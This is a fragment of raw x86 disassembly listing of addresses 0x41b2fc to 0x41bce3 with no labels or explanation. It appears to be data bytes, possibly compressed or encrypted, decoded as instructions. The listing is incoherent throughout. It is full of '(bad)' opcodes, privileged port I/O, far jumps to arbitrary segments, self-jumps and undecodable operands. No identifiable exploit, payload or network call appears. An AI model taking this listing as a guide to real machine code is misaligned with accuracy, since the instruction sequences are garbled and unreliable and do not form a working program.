  41b2fc:	mov    eax,ds:0xde7428ba
  41b301:	mov    eax,0x74d66484
  41b306:	(bad)  
  41b307:	in     al,0x8a
  41b309:	popa   
  41b30a:	jne    0x41b360
  41b30c:	ds int 0xd8
  41b30f:	mov    ch,0x15
  41b311:	repnz out dx,al
  41b313:	push   eax
  41b314:	mov    edi,0x6056ea82
  41b319:	loope  0x41b2dd
  41b31b:	call   edi
  41b31d:	lfs    ebp,FWORD PTR [ecx]
  41b320:	mov    esi,0xc3c6a1e
  41b325:	add    al,0xf9
  41b327:	adc    ch,BYTE PTR [eax-0x2d]
  41b32a:	jmp    0x6863:0xdbd66faa
  41b331:	loop   0x41b383
  41b333:	sti    
  41b334:	enter  0x0,0x0
	...
  41b394:	add    BYTE PTR [eax],al
  41b396:	dec    eax
  41b397:	or     eax,0xbb5dab1d
  41b39c:	(bad)  
  41b39d:	out    dx,eax
  41b39e:	cld    
  41b39f:	(bad)  
  41b3a0:	mov    ?,eax
  41b3a2:	xchg   DWORD PTR es:[ebp+0x39],esp
  41b3a6:	nop    DWORD PTR [ecx]
  41b3a9:	add    BYTE PTR [edi],al
  41b3ab:	add    DWORD PTR [eax],eax
  41b3ad:	add    BYTE PTR [ecx+0x30],dl
  41b3b0:	mov    dh,0x86
  41b3b2:	dec    ebp
  41b3b3:	imul   esp,ecx,0x52892da6
  41b3b9:	mov    ebp,0x7dcd3e3b
  41b3be:	adc    DWORD PTR [edi-0x4f101fb9],esp
  41b3c4:	jns    0x41b390
  41b3c6:	mul    DWORD PTR [ecx-0x16]
  41b3c9:	adc    eax,DWORD PTR [ecx]
  41b3cb:	sub    bh,BYTE PTR [eax]
  41b3cd:	xchg   esi,eax
  41b3ce:	mov    bl,0x1c
  41b3d0:	icebp  
  41b3d1:	mov    ds:0x6a5fba1f,al
  41b3d6:	call   0x3d5e5dc5
  41b3db:	daa    
  41b3dc:	aad    0xdb
  41b3de:	stc    
  41b3df:	ja     0x41b40e
  41b3e1:	mov    edi,0x609a121d
  41b3e6:	jecxz  0x41b3e6
  41b3e8:	mov    eax,0x16bed563
  41b3ed:	add    al,BYTE PTR [eax+0xc79c03f]
  41b3f3:	pop    ds
  41b3f4:	mov    bl,BYTE PTR [eax]
  41b3f6:	(bad)  
  41b3f7:	xchg   DWORD PTR [edi],ecx
  41b3f9:	repnz mov ebx,DWORD PTR [edx-0x31ba35e8]
  41b400:	ret    
  41b401:	sbb    BYTE PTR [eax],bl
  41b403:	clc    
  41b404:	ret    0x5c2a
  41b407:	pushf  
  41b408:	cdq    
  41b409:	test   BYTE PTR [ebx-0x4c2890aa],0xeb
  41b410:	mov    dl,0xed
  41b412:	dec    ebp
  41b413:	call   0xdd9c:0x1330af82
  41b41a:	out    dx,al
  41b41b:	jnp    0x41b3f2
  41b41d:	inc    ebx
  41b41e:	lods   al,BYTE PTR ds:[esi]
  41b41f:	sbb    ebp,ebx
  41b421:	sub    al,0x7c
  41b423:	jge    0x41b46d
  41b425:	dec    edi
  41b426:	sub    al,0xe7
  41b428:	(bad)  
  41b429:	add    eax,0x5a29908
  41b42e:	aaa    
  41b42f:	jmp    0x28c2:0xd3aea13
  41b436:	iret   
  41b437:	int3   
  41b438:	cmp    edi,DWORD PTR [ecx-0x2d]
  41b43b:	and    BYTE PTR [edi-0x7f25cfd9],ch
  41b441:	push   0xffffffe1
  41b443:	jnp    0x41b4c1
  41b445:	loop   0x41b472
  41b447:	call   0x387c:0x457da082
  41b44e:	ja     0x41b4af
  41b450:	outs   dx,DWORD PTR ds:[esi]
  41b451:	add    ecx,DWORD PTR [esi+0xb763115]
  41b457:	xor    cl,BYTE PTR [esi+esi*8+0x6ecb0d6e]
  41b45e:	into   
  41b45f:	je     0x41b3ff
  41b461:	lods   eax,DWORD PTR ds:[esi]
  41b462:	mov    al,0xeb
  41b464:	xlat   BYTE PTR ds:[ebx]
  41b465:	cmc    
  41b466:	xor    al,0x5
  41b468:	sub    eax,0xee099066
  41b46d:	inc    esp
  41b46e:	(bad)  
  41b46f:	adc    al,0x7
  41b471:	scas   al,BYTE PTR es:[edi]
  41b472:	cmp    al,0xa3
  41b474:	shl    eax,0x29
  41b477:	inc    ebp
  41b478:	stos   DWORD PTR es:[edi],eax
  41b479:	popf   
  41b47a:	xor    bl,BYTE PTR [ebp+0x64dbc8f0]
  41b480:	push   eax
  41b481:	sub    al,0xa7
  41b483:	je     0x41b429
  41b485:	mov    ah,0x9
  41b487:	pop    ebx
  41b488:	sbb    eax,0xc5df5bb9
  41b48d:	sti    
  41b48e:	sbb    BYTE PTR [ebx+edi*1+0x26d45320],ah
  41b495:	popf   
  41b496:	jmp    0x41b496
  41b498:	jg     0x41b4bc
  41b49a:	pop    edx
  41b49b:	add    DWORD PTR [eax+eiz*8-0x56],esi
  41b49f:	cwde   
  41b4a0:	mov    al,ds:0xb6993593
  41b4a5:	pop    ss
  41b4a6:	or     al,0x90
  41b4a8:	mov    cl,0x88
  41b4aa:	imul   ebp,ebp,0xcc10207d
  41b4b0:	push   es
  41b4b1:	popf   
  41b4b2:	cmp    al,0xd1
  41b4b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
	...
  41b515:	add    ah,dl
  41b517:	in     al,dx
  41b518:	add    edi,edi
  41b51a:	cmp    edi,edi
  41b51c:	(bad)  
  41b51d:	out    dx,eax
  41b51e:	lock add DWORD PTR [ebp-0x3c],ebp
  41b522:	push   es
  41b523:	jecxz  0x41b537
  41b525:	outs   dx,BYTE PTR ds:[esi]
  41b526:	push   ss
  41b527:	and    BYTE PTR [ecx],al
  41b529:	add    BYTE PTR [edi],al
  41b52b:	add    DWORD PTR [eax],eax
  41b52d:	add    BYTE PTR [esi-0x3d],dl
  41b530:	inc    edx
  41b531:	clc    
  41b532:	inc    ecx
  41b533:	pop    ebp
  41b534:	gs dec edi
  41b536:	int    0x9e
  41b538:	push   edx
  41b539:	lds    esp,FWORD PTR [esi-0x72]
  41b53c:	and    al,0x2c
  41b53e:	rcl    BYTE PTR [edi-0x57],1
  41b541:	adc    DWORD PTR [ebp-0xb5c2872],eax
  41b547:	(bad)  
  41b549:	aad    0x4d
  41b54b:	test   BYTE PTR [esi-0xc],al
  41b54e:	xchg   edi,eax
  41b54f:	xchg   ecx,eax
  41b550:	clc    
  41b551:	rcr    BYTE PTR [ebp-0x57],cl
  41b554:	sbb    al,0x73
  41b556:	pop    ds
  41b557:	bound  esi,QWORD PTR [ebx+0x62]
  41b55a:	xchg   BYTE PTR [edx+ecx*8],bh
  41b55d:	fisttp QWORD PTR ds:0x4191d1ad
  41b563:	pop    esi
  41b564:	data16 sar bh,cl
  41b567:	jge    0x41b56f
  41b569:	vsubpd ymm4,ymm1,YMMWORD PTR [ebp+0x1f403344]
  41b571:	in     al,0x45
  41b573:	mul    DWORD PTR [ecx+0x31b53eed]
  41b579:	or     BYTE PTR [ebx+0x58],al
  41b57c:	adc    eax,DWORD PTR [ecx+0x5325cb0f]
  41b582:	inc    esp
  41b583:	fsub   DWORD PTR [ebp+0x12c8acab]
  41b589:	sub    ah,BYTE PTR [edx+0x6f]
  41b58c:	neg    BYTE PTR [eax-0x2d]
  41b58f:	dec    ecx
  41b590:	fs mov ecx,0x50a65d84
  41b596:	adc    edi,DWORD PTR [edx]
  41b598:	scas   al,BYTE PTR es:[edi]
  41b599:	mov    ecx,0x468aec4d
  41b59e:	ret    
  41b59f:	test   eax,ecx
  41b5a1:	loopne 0x41b566
  41b5a3:	and    DWORD PTR [ecx-0x2a6338ac],eax
  41b5a9:	inc    ebx
  41b5aa:	data16 mov bh,0xba
  41b5ad:	mov    ebp,0x8bb98dce
  41b5b2:	(bad)  [edx+edi*2-0x3c]
  41b5b6:	mov    ds:0x9614617f,al
  41b5bb:	push   eax
  41b5bc:	xor    al,BYTE PTR [ecx+0x60]
  41b5bf:	mov    eax,0xd0327eeb
  41b5c4:	xor    BYTE PTR [ebx-0x29],ch
  41b5c7:	iret   
  41b5c8:	pop    ebx
  41b5c9:	mov    ch,0xa5
  41b5cb:	clc    
  41b5cc:	mov    bh,BYTE PTR [edi+0x290a7f8]
  41b5d2:	jmp    0x2e53:0x2799b3fc
  41b5d9:	dec    eax
  41b5da:	mov    al,ds:0x61f9af12
  41b5df:	(bad)  
  41b5e0:	jg     0x41b5c9
  41b5e2:	rcr    DWORD PTR [ebx],1
  41b5e4:	in     eax,0xe
  41b5e6:	shl    BYTE PTR [esp+ecx*4-0x45],0xad
  41b5eb:	mov    esi,0x28e9c60a
  41b5f0:	xchg   ebp,eax
  41b5f1:	loope  0x41b61c
  41b5f3:	mov    ecx,0x9935914f
  41b5f8:	and    ah,al
  41b5fa:	xchg   edi,eax
  41b5fb:	mov    edx,0xe674b13b
  41b600:	mov    al,0x42
  41b602:	sbb    eax,0x18f1e0f4
  41b607:	cli    
  41b608:	(bad)
  41b60b:	add    DWORD PTR ds:0xbf8d7781,esp
  41b611:	retf   
  41b612:	mov    ah,0x25
  41b614:	fidiv  DWORD PTR [eax+ebp*1+0x15]
  41b618:	(bad)  
  41b619:	out    dx,eax
  41b61a:	(bad)  
  41b61b:	imul   ebp,eax,0xdb9eaab1
  41b621:	pusha  
  41b622:	pop    edx
  41b623:	cmp    al,0x91
  41b625:	nop
  41b626:	scas   eax,DWORD PTR es:[edi]
  41b627:	mov    eax,ds:0x1c87b376
  41b62c:	int    0x78
  41b62e:	outs   dx,BYTE PTR ds:[esi]
  41b62f:	add    al,0x33
  41b631:	push   eax
  41b632:	sahf   
  41b633:	lds    ebp,FWORD PTR [edi]
	...
  41b695:	add    BYTE PTR [eax-0x2469e49d],ch
  41b69b:	(bad)  
  41b69c:	lods   eax,DWORD PTR ds:[esi]
  41b69d:	jg     0x41b6db
  41b69f:	sub    al,dl
  41b6a1:	add    BYTE PTR [ebp-0x1],al
  41b6a4:	out    dx,al
  41b6a5:	jg     0x41b6c4
  41b6a7:	and    DWORD PTR [ecx],eax
  41b6a9:	add    BYTE PTR [edi],al
  41b6ab:	add    DWORD PTR [eax],eax
  41b6ad:	add    dh,dl
  41b6af:	outs   dx,BYTE PTR ds:[esi]
  41b6b0:	add    al,0x4e
  41b6b2:	pop    edx
  41b6b3:	mov    dh,0xef
  41b6b5:	imul   eax,DWORD PTR [ebx+0x4b162f0e],0x29
  41b6bc:	pop    esi
  41b6bd:	scas   eax,DWORD PTR es:[edi]
  41b6be:	adc    DWORD PTR [ebx-0x27],edi
  41b6c1:	arpl   WORD PTR [ecx+0x291e1a3],bp
  41b6c7:	jmp    0x41b690
  41b6c9:	hlt    
  41b6ca:	xchg   esp,esi
  41b6cc:	cmp    al,0x4f
  41b6ce:	aam    0xbd
  41b6d0:	les    ebx,FWORD PTR [edi+0x3c]
  41b6d3:	mov    ds:0x6761a0a6,eax
  41b6d8:	lods   eax,DWORD PTR ds:[esi]
  41b6d9:	xchg   ebx,ebx
  41b6db:	adc    BYTE PTR [ebx],dl
  41b6dd:	xor    dh,BYTE PTR [esi]
  41b6df:	imul   edi,DWORD PTR [eax+0x3b],0x52
  41b6e3:	sub    DWORD PTR [edi],ebx
  41b6e5:	push   es
  41b6e6:	jmp    0xdfefdb4a
  41b6eb:	push   esp
  41b6ec:	push   eax
  41b6ed:	aam    0x65
  41b6ef:	fs push ebx
  41b6f1:	fisub  WORD PTR [ebx+ecx*2]
  41b6f4:	mov    edx,0x7ca6157a
  41b6f9:	mov    ch,0x93
  41b6fb:	mov    dh,0xe9
  41b6fd:	imul   DWORD PTR [esp+ebp*1]
  41b700:	mov    bh,0x76
  41b702:	and    BYTE PTR [eax-0x7514f19b],al
  41b708:	or     cl,0x3b
  41b70b:	dec    ebx
  41b70c:	push   ebp
  41b70d:	(bad)  
  41b70f:	sub    bh,bh
  41b711:	cmp    al,0x36
  41b713:	in     al,0x2a
  41b715:	dec    ebx
  41b716:	xor    eax,0x12e3e4be
  41b71b:	mov    BYTE PTR [ebp-0x1d],ah
  41b71e:	xor    al,0xd8
  41b720:	sbb    al,0x10
  41b722:	hlt    
  41b723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b724:	jae    0x41b6d0
  41b726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b727:	jmp    0xbb66b09d
  41b72c:	jg     0x41b77e
  41b72e:	and    DWORD PTR [eax-0x7b9ce954],ebx
  41b734:	pop    ebx
  41b735:	adc    eax,ebx
  41b737:	xor    DWORD PTR [ecx+0x17],esi
  41b73a:	out    dx,al
  41b73b:	sbb    eax,0x5e8b16fd
  41b740:	mov    ebp,0x1082cd0d
  41b745:	jnp    0x41b71a
  41b747:	mov    bl,0x4
  41b749:	jecxz  0x41b6de
  41b74b:	mov    esi,0x67d31804
  41b750:	and    al,0x50
  41b752:	ret    0xe72c
  41b755:	xor    BYTE PTR [ebx+edx*4+0x4beddeeb],al
  41b75c:	fwait
  41b75d:	into   
  41b75e:	dec    edi
  41b75f:	in     eax,dx
  41b760:	scas   eax,DWORD PTR es:[edi]
  41b761:	pusha  
  41b762:	dec    edi
  41b763:	xchg   ecx,eax
  41b764:	cdq    
  41b765:	xor    BYTE PTR [eax+0x8c19c1c],dh
  41b76b:	out    0x78,eax
  41b76d:	fimul  WORD PTR [ecx+0x10]
  41b770:	clc    
  41b771:	pop    es
  41b772:	stos   BYTE PTR es:[edi],al
  41b773:	push   0x698328d1
  41b778:	jb     0x41b7d8
  41b77a:	and    edx,ebp
  41b77c:	call   0x3596:0x5e70058b
  41b783:	xlat   BYTE PTR ds:[ebx]
  41b784:	xchg   ebp,eax
  41b785:	push   cs
  41b786:	and    DWORD PTR [edx+0x3cbe07ed],edi
  41b78c:	cmp    DWORD PTR [edx-0x1b5d5a04],ebp
  41b792:	rol    DWORD PTR [eax],0x2c
  41b795:	cli    
  41b796:	ds das 
  41b798:	adc    ch,BYTE PTR [edx-0x7a]
  41b79b:	(bad)  
  41b79c:	iret   
  41b79d:	(bad)  
  41b79e:	and    BYTE PTR [ecx-0x7b891d4d],dl
  41b7a4:	sub    al,0xba
  41b7a6:	fwait
  41b7a7:	dec    ebx
  41b7a8:	cmp    al,dh
  41b7aa:	(bad)  
  41b7ab:	das    
  41b7ac:	jbe    0x41b7d1
  41b7ae:	jmp    0x41b754
  41b7b0:	dec    ebp
  41b7b1:	sub    BYTE PTR [ebx+0x75],ah
  41b7b4:	cli    
	...
  41b815:	add    BYTE PTR [edx-0x8b13804],cl
  41b81b:	jg     0x41b7a8
  41b81d:	cld    
  41b81e:	fcmovbe st,st(0)
  41b820:	(bad)  
  41b821:	out    0xd3,al
  41b823:	inc    esi
  41b824:	jg     0x41b7bb
  41b826:	and    al,0x22
  41b828:	add    DWORD PTR [eax],eax
  41b82a:	pop    es
  41b82b:	add    DWORD PTR [eax],eax
  41b82d:	add    BYTE PTR [edx+edi*4],bh
  41b830:	ss call 0xd69e:0x3dece5a8
  41b838:	and    BYTE PTR [ebx+0x7eb36544],0x90
  41b83f:	fstp   TBYTE PTR [eax-0x5e]
  41b842:	sbb    dl,BYTE PTR [ebp-0x19]
  41b845:	mov    ebp,0x39a55891
  41b84a:	xlat   BYTE PTR ds:[ebx]
  41b84b:	mov    edi,0x2398b235
  41b850:	xor    esi,ebp
  41b852:	push   0x67343163
  41b857:	in     eax,0x8a
  41b859:	xchg   BYTE PTR [edi-0x4574054b],cl
  41b85f:	mov    eax,ds:0x5da56e4e
  41b864:	in     eax,dx
  41b865:	lods   eax,DWORD PTR ds:[esi]
  41b866:	sbb    edx,DWORD PTR [ecx-0x6e]
  41b869:	in     eax,0x8c
  41b86b:	repz xchg edi,eax
  41b86d:	mov    ecx,0x2cea0516
  41b872:	sbb    dh,BYTE PTR [esi-0x6]
  41b875:	pop    ebp
  41b876:	inc    ebp
  41b877:	outs   dx,BYTE PTR ds:[esi]
  41b878:	inc    DWORD PTR [eax+0x28]
  41b87b:	jns    0x41b838
  41b87d:	adc    bl,BYTE PTR [ebx+0x1e]
  41b880:	int    0xa0
  41b882:	xchg   edi,eax
  41b883:	or     al,0x74
  41b885:	mov    ds:0x5cd58e60,eax
  41b88a:	xor    eax,0x9a38d4fb
  41b88f:	cli    
  41b890:	sbb    ebx,ebp
  41b892:	enter  0x306b,0x10
  41b896:	mov    cl,0xe4
  41b898:	mov    ecx,fs
  41b89a:	and    eax,DWORD PTR [esi-0x4d96f4e4]
  41b8a0:	nop
  41b8a1:	sahf   
  41b8a2:	dec    ebx
  41b8a3:	adc    eax,0xd92f5f85
  41b8a8:	nop
  41b8a9:	pop    edi
  41b8aa:	cwde   
  41b8ab:	mov    esp,0x4250e4d9
  41b8b0:	sbb    al,0x84
  41b8b2:	popf   
  41b8b3:	or     BYTE PTR [esi],al
  41b8b5:	aam    0x53
  41b8b7:	push   esi
  41b8b8:	mov    esi,0xb576e084
  41b8bd:	sbb    cl,BYTE PTR [ebp+ecx*4-0x6b33ea56]
  41b8c4:	cmp    bh,cl
  41b8c6:	not    DWORD PTR [ecx-0x7d]
  41b8c9:	outs   dx,BYTE PTR gs:[esi]
  41b8cb:	iret   
  41b8cc:	jle    0x41b8c3
  41b8ce:	arpl   dx,dx
  41b8d0:	push   edx
  41b8d1:	pop    esp
  41b8d2:	ss pop ecx
  41b8d4:	loope  0x41b8d7
  41b8d6:	inc    ebp
  41b8d7:	out    0x30,eax
  41b8d9:	in     eax,0x33
  41b8db:	or     ebp,DWORD PTR [edi]
  41b8dd:	and    DWORD PTR [edi+0x5eba489e],esi
  41b8e3:	xor    al,0x5e
  41b8e5:	pop    edx
  41b8e6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8e7:	push   0xfffffffc
  41b8e9:	rol    DWORD PTR es:[esi+0x46],0xfe
  41b8ee:	into   
  41b8ef:	adc    bh,BYTE PTR [eax+eax*4]
  41b8f2:	mov    al,ds:0x93b3427d
  41b8f7:	xchg   esi,eax
  41b8f8:	xchg   esp,eax
  41b8f9:	jno    0x41b899
  41b8fb:	adc    eax,0x3a7784b5
  41b900:	(bad)  
  41b901:	shl    BYTE PTR [ecx+0x54],cl
  41b904:	add    BYTE PTR [ebx-0x5cdeb324],0x71
  41b90b:	xor    BYTE PTR [ebx+esi*4+0x0],bh
  41b90f:	and    edx,DWORD PTR [ebx+edi*4-0x40]
  41b913:	sub    ah,dl
  41b915:	rcl    BYTE PTR [eax],1
  41b917:	repz push ebx
  41b919:	idiv   ch
  41b91b:	xchg   esp,eax
  41b91c:	mov    dh,0x40
  41b91e:	test   DWORD PTR [ecx+0x74350a88],ebx
  41b924:	jns    0x41b955
  41b926:	jmp    0x41b95e
  41b928:	xor    eax,DWORD PTR [edx]
  41b92a:	jne    0x41b956
  41b92c:	mov    bl,0x19
  41b92e:	lahf   
  41b92f:	icebp  
  41b930:	sbb    esi,DWORD PTR [esi+0x731d94]
	...
  41b996:	ret    
  41b997:	mov    esp,0xf87f4844
  41b99c:	iret   
  41b99d:	mov    edi,0x51d578ae
  41b9a2:	test   DWORD PTR [edi],ecx
  41b9a4:	stos   BYTE PTR es:[edi],al
  41b9a5:	jmp    0x107:0x1232b
  41b9ac:	add    BYTE PTR [eax],al
  41b9ae:	(bad)  
  41b9b0:	out    dx,eax
  41b9b1:	stos   BYTE PTR es:[edi],al
  41b9b2:	shr    BYTE PTR [eax+0x2b],0x21
  41b9b6:	fnstenv [edi]
  41b9b8:	(bad)  [edx-0x11]
  41b9bb:	hlt    
  41b9bc:	jno    0x41ba0c
  41b9be:	or     ah,BYTE PTR [edi+0x58bd7fa3]
  41b9c4:	xor    DWORD PTR [edi+0x49888d58],0x7bcfdfea
  41b9ce:	fs pop edx
  41b9d0:	push   es
  41b9d1:	loop   0x41ba30
  41b9d3:	jmp    0x2995:0x7208d722
  41b9da:	pop    ebx
  41b9db:	call   0xc5a1:0xbcf45baa
  41b9e2:	ds and ecx,ecx
  41b9e5:	icebp  
  41b9e6:	test   edx,esi
  41b9e8:	mov    ?,WORD PTR [ecx+0x2f]
  41b9eb:	and    al,0x88
  41b9ed:	mov    edi,0xa27377f5
  41b9f2:	cli    
  41b9f3:	push   edx
  41b9f4:	pop    esi
  41b9f5:	inc    eax
  41b9f6:	lea    eax,[ecx+0x73]
  41b9f9:	pop    edx
  41b9fa:	loop   0x41ba70
  41b9fc:	sub    BYTE PTR [edx-0x5e856a69],bl
  41ba02:	jle    0x41ba14
  41ba04:	mov    fs,WORD PTR [edx+0x76]
  41ba07:	mov    BYTE PTR [edi-0x2d],ch
  41ba0a:	dec    esi
  41ba0b:	and    ah,BYTE PTR [ebp+0x358ce99b]
  41ba11:	push   ecx
  41ba12:	xchg   DWORD PTR [ebx+eiz*2+0xa],ebx
  41ba16:	push   edi
  41ba17:	pop    esp
  41ba18:	sub    edx,esp
  41ba1a:	add    BYTE PTR [ecx+0x0],al
  41ba1d:	mov    BYTE PTR [edx+0x52a936e9],bl
  41ba23:	pop    esp
  41ba24:	ins    BYTE PTR es:[edi],dx
  41ba25:	mov    edi,0x8b737d60
  41ba2a:	mov    bl,0x96
  41ba2c:	fchs   
  41ba2e:	lock cmp dh,BYTE PTR [eax-0x77]
  41ba32:	je     0x41ba41
  41ba34:	out    0xcc,eax
  41ba36:	ins    DWORD PTR es:[edi],dx
  41ba37:	(bad)  
  41ba38:	jmp    0x9a6ca1ad
  41ba3d:	push   0xfffffff1
  41ba3f:	leave  
  41ba40:	or     eax,0xab0880a9
  41ba45:	dec    ecx
  41ba46:	mov    edx,DWORD PTR [eax+0x6d10fba7]
  41ba4c:	xchg   DWORD PTR [ecx-0x78],esi
  41ba4f:	icebp  
  41ba50:	and    edx,DWORD PTR [edx]
  41ba52:	out    0xf0,al
  41ba54:	xchg   eax,edi
  41ba56:	inc    edi
  41ba57:	cmp    al,0x13
  41ba59:	add    edx,DWORD PTR [edi+esi*1]
  41ba5c:	xor    ebp,DWORD PTR [eax-0x429d0ce6]
  41ba62:	(bad)  
  41ba63:	(bad)  
  41ba64:	push   cs
  41ba65:	scas   al,BYTE PTR es:[edi]
  41ba66:	stos   DWORD PTR es:[edi],eax
  41ba67:	hlt    
  41ba68:	sti    
  41ba69:	(bad)  
  41ba6a:	adc    edx,edx
  41ba6c:	imul   ebp,edi,0xffffffe3
  41ba6f:	pushf  
  41ba70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba71:	jle    0x41ba7b
  41ba73:	jno    0x41ba86
  41ba75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ba76:	inc    edx
  41ba77:	sbb    BYTE PTR [eax+0x7ce177f9],bh
  41ba7d:	out    0x71,al
  41ba7f:	xchg   DWORD PTR [edx-0x15471c52],ebx
  41ba85:	mov    ecx,0xc647a3d9
  41ba8a:	mov    esi,0x814ed018
  41ba8f:	push   esp
  41ba90:	inc    edi
  41ba91:	sbb    dl,BYTE PTR [edi+0x74587e0a]
  41ba97:	out    dx,eax
  41ba98:	and    al,0x9
  41ba9a:	sub    dh,ch
  41ba9c:	xlat   BYTE PTR ds:[ebx]
  41ba9d:	out    0x1d,al
  41ba9f:	add    eax,0x3e32f534
  41baa4:	(bad)  
  41baa5:	nop/reserved BYTE PTR [eax+0x48]
  41baa9:	cmp    BYTE PTR [ebx+0x3d],0xc8
  41baad:	arpl   WORD PTR [edx+eiz*2],di
  41bab0:	loope  0x41baa8
  41bab2:	sub    eax,ecx
  41bab4:	add    BYTE PTR gs:[eax],al
	...
  41bb13:	add    BYTE PTR [eax],al
  41bb15:	add    BYTE PTR [edx],cl
  41bb17:	mov    eax,0xbfb7aaa5
  41bb1c:	(bad)  
  41bb1e:	lahf   
  41bb1f:	and    esp,DWORD PTR [ebx-0x56]
  41bb22:	or     BYTE PTR [ebp+0x66],ch
  41bb25:	mov    esp,0x12432
  41bb2a:	pop    es
  41bb2b:	add    DWORD PTR [eax],eax
  41bb2d:	add    BYTE PTR [edx],bh
  41bb2f:	cmp    al,0x7b
  41bb31:	push   ebp
  41bb32:	sub    BYTE PTR [ecx-0x4],0x6c
  41bb36:	sub    dl,dh
  41bb38:	je     0x41bb63
  41bb3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb3c:	inc    edi
  41bb3d:	dec    ebx
  41bb3e:	mov    ah,ch
  41bb40:	repz add eax,0x4c7b791e
  41bb46:	(bad)  [ecx-0x21]
  41bb49:	push   es
  41bb4a:	popf   
  41bb4b:	aam    0xae
  41bb4d:	or     DWORD PTR [eax],ebp
  41bb4f:	jae    0x41baea
  41bb51:	jmp    0x41bbb3
  41bb53:	sbb    eax,0xe7764f09
  41bb58:	dec    ecx
  41bb59:	adc    eax,0xe33dbb60
  41bb5e:	add    al,0x5f
  41bb60:	call   0x5f3e:0xeb051d57
  41bb67:	outs   dx,BYTE PTR ds:[esi]
  41bb68:	mov    ah,0x91
  41bb6a:	js     0x41bb68
  41bb6c:	aad    0x9b
  41bb6e:	pop    ecx
  41bb6f:	add    BYTE PTR [ecx-0x1e62e578],ch
  41bb75:	mov    edx,0xb6dfaa6e
  41bb7a:	cmp    DWORD PTR [esi+eiz*2],edi
  41bb7d:	in     al,dx
  41bb7e:	enter  0xfacc,0x1a
  41bb82:	(bad)  
  41bb83:	into   
  41bb84:	repz cs fucomi st,st(5)
  41bb88:	call   edi
  41bb8a:	xor    al,0x5f
  41bb8c:	nop
  41bb8d:	in     eax,dx
  41bb8e:	repz mov ch,0x60
  41bb91:	xchg   ebx,eax
  41bb92:	mov    ch,0x56
  41bb94:	lods   eax,DWORD PTR ds:[esi]
  41bb95:	sbb    esi,DWORD PTR [ebp+0x2c]
  41bb98:	ret    0x8bd3
  41bb9b:	or     BYTE PTR [esp+ecx*4],0x55
  41bb9f:	ins    DWORD PTR es:[edi],dx
  41bba0:	mov    bh,0x8e
  41bba2:	test   ebp,eax
  41bba4:	pop    ecx
  41bba5:	jne    0x41bb31
  41bba7:	push   ebp
  41bba8:	repz mov ah,0xc7
  41bbab:	jecxz  0x41bc1d
  41bbad:	imul   edx,DWORD PTR [esi],0x721a8485
  41bbb3:	hlt    
  41bbb4:	into   
  41bbb5:	gs ss (bad) 
  41bbb8:	scas   eax,DWORD PTR es:[edi]
  41bbb9:	cli    
  41bbba:	cmp    DWORD PTR [edi+ecx*2+0x888eeb1],esi
  41bbc1:	imul   edi,edi,0x8cffdb8f
  41bbc7:	mov    ebx,0xffa9d5f3
  41bbcc:	xchg   ebp,eax
  41bbcd:	xchg   edx,eax
  41bbce:	push   ss
  41bbcf:	stos   BYTE PTR es:[edi],al
  41bbd0:	mov    ebp,0x4b7e637d
  41bbd5:	dec    edx
  41bbd6:	js     0x41bc39
  41bbd8:	add    BYTE PTR [ebx+0x5b],0x4a
  41bbdc:	jno    0x41bbaa
  41bbde:	jnp    0x41bc55
  41bbe0:	jnp    0x41bb79
  41bbe2:	cs (bad) 
  41bbe4:	loopne 0x41bbb3
  41bbe6:	push   esp
  41bbe7:	jg     0x41bc1a
  41bbe9:	inc    ecx
  41bbea:	dec    ebx
  41bbeb:	fcmovnu st,st(2)
  41bbed:	dec    edx
  41bbee:	or     BYTE PTR [eax+0x7eb05f67],bl
  41bbf4:	repnz xor al,0x0
  41bbf7:	je     0x41bc50
  41bbf9:	shl    BYTE PTR [edi+eiz*8-0x3fe6872e],0xfd
  41bc01:	(bad)  
  41bc03:	lahf   
  41bc04:	mov    WORD PTR [ebx-0xe4bc34],es
  41bc0a:	cli    
  41bc0b:	xchg   esp,eax
  41bc0c:	std    
  41bc0d:	ficomp DWORD PTR [edi-0x75]
  41bc10:	dec    ebp
  41bc11:	ss push ebp
  41bc13:	int3   
  41bc14:	add    bl,BYTE PTR [esp+eax*1]
  41bc17:	or     eax,0xdfcf1ee8
  41bc1c:	iret   
  41bc1d:	dec    edx
  41bc1e:	jmp    0x41bc20
  41bc20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc21:	pop    eax
  41bc22:	nop
  41bc23:	and    ebx,esi
  41bc25:	xchg   esp,eax
  41bc26:	sahf   
  41bc27:	add    cl,al
  41bc29:	aam    0xe
  41bc2b:	dec    edi
  41bc2c:	scas   eax,DWORD PTR es:[edi]
  41bc2d:	jmp    0x41bbd7
  41bc2f:	push   edx
  41bc30:	jne    0x41bc76
  41bc32:	vmwrite eax,esp
	...
  41bc95:	add    dl,dl
  41bc97:	xor    bh,dl
  41bc99:	clc    
  41bc9a:	cli    
  41bc9b:	clc    
  41bc9c:	sar    BYTE PTR [edx],cl
  41bc9e:	js     0x2205248d
  41bca4:	xor    al,0x53
  41bca6:	cmp    DWORD PTR ds:0x1070001,esp
  41bcac:	add    BYTE PTR [eax],al
  41bcae:	imul   ebx,DWORD PTR [edx+0x305f1da8],0xffffffa5
  41bcb5:	mov    bh,0xe5
  41bcb7:	mov    al,0x4e
  41bcb9:	mov    dl,0xae
  41bcbb:	xchg   ebp,eax
  41bcbc:	icebp  
  41bcbd:	dec    eax
  41bcbe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcbf:	into   
  41bcc0:	xchg   ecx,eax
  41bcc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcc2:	retf   0x59b4
  41bcc5:	cdq    
  41bcc6:	inc    ebx
  41bcc7:	std    
  41bcc8:	test   al,0xa6
  41bcca:	xchg   edi,eax
  41bccb:	(bad)  
  41bccc:	out    dx,eax
  41bccd:	or     DWORD PTR [edx+0x1671ab8b],eax
  41bcd3:	repz push ebx
  41bcd5:	adc    eax,0xa10a4385
  41bcda:	and    eax,0xbfe29e6b
  41bcdf:	sbb    dh,cl
  41bce1:	retf   
  41bce2:	iret   
  41bce3:	scas   eax,DWORD PTR es:[edi]
